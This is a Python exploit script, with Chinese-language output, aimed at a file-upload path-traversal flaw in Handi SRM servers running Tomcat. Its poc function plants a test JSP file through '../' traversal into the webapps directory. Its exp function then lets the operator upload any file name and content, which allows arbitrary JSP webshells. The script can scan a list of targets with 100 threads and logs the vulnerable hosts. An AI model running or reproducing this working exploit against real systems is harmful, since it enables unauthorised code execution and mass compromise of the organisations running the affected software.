import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
# 测试http://hd5agile.top
def banner():
    test = """
                                               ______
______________________________________________ ___  /
___  __ \  _ \_  ___/_  ___/  __ \_  __ \  __ `/_  / 
__  /_/ /  __/  /   _(__  )/ /_/ /  / / / /_/ /_  /  
_  .___/\___//_/    /____/ \____//_/ /_/\__,_/ /_/   
/_/                                                  
                                   author:NaA100
                                   date:2024-09-3
                                   version:1.0                    
"""
    print(test)

def poc(target):
    payload = '/center/api/files;.js'
    shell =''
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    data = '--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/NaA100.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\n<%out.println(\"NaA100\");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--'
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }

    try:
        res1 = requests.post(url=target+payload,verify=False,proxies=proxie,data=data,headers=headers,timeout=5)
        print(res1.text)
        if res1.status_code == 200 and 'link' in res1.text:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'{target}\n')
            print(f"[+]该{target}存在文件上传")
            exp(target)
        else:
            print(f"[-]该{target}不存在文件上传")

    except Exception as e:
        print(e)


def exp(target):
    payload = '/center/api/files;.js'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 SE 2.X MetaSr 1.0",
        "Cache-Control": "no-cache",
        "Content-Type": "multipart/form-data; boundary=e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f",
        "Pragma": "no-cache",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "close"
    }
    proxie = {
        "http": "http://127.0.0.1:7890",
        "https": "http://127.0.0.1:7890",
    }
    filename = input('文件名（需添加后缀名）：')
    code = input('文件内容')
    data = '--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/'+f'{filename}'+'\"\r\nContent-Type: application/octet-stream\r\n\r\n'+f'{code}'+'\r\n--e0e1d419983f8f0e95c2d9ccf9b54e488353b5db7bac34b1a973ea9d0f0f--'
    res1 = requests.post(url=target + payload, verify=False, proxies=proxie, data=data, headers=headers, timeout=5)
    # print(res1.text)
    if res1.status_code == 200 and 'link' in res1.text:
        print(f"{filename}上传成功，请访问路径{target}/clusterMgr/{filename};.js")
    else:
        print(f"[-]该{target}不存在文件上传")


def main():

    banner()
    url_list = []
    parse = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")

    parse.add_argument("-u","--url",dest="url",type=str,help="Please enter url")
    parse.add_argument("-f","--file",dest="file",type=str,help="Please enter file")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"您的输入有误，请使用python file_name.py -h for help")

if __name__ == '__main__':
    main()